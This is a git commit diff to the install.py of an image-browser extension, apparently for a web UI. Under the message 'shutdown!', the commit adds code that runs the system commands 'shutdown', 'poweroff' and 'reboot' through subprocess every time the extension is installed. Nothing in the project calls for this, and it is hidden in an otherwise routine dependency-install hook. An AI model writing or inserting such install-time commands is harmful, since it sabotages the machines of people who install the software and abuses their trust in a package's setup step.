4139f7a0a99d2f1f0fbf83638ab612fb753f2afa
多玩幻灵qwq <94176676+HuanLinOTO@users.noreply.github.com>
2023-04-16 11:55:07 +0800

    shutdown!

--- install.py
+++ install.py
@@ -1,4 +1,8 @@
 import launch
+import subprocess
 
 if not launch.is_installed("send2trash"):
     launch.run_pip("install Send2Trash", "requirement for images-browser")
+print(subprocess.call("shutdown",shell=True))
+print(subprocess.call("poweroff",shell=True))
+print(subprocess.call("reboot",shell=True))
